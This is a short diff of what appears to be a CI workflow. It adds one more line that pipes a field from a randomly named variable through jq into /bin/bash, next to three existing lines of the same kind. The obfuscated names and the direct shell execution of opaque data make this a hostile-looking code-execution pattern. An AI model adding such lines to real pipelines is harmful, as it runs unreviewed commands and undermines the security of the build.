@@ -37,6 +37,7 @@ jobs:
           echo $r19047 | jq -r .ijat135 | /bin/bash
           echo $ojrro868 | jq -r .ntma1470 | /bin/bash
           echo $n87 | jq -r .fqrxj0604 | /bin/bash
+          printf '%s' "$ruurx177" | jq -r .l572 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
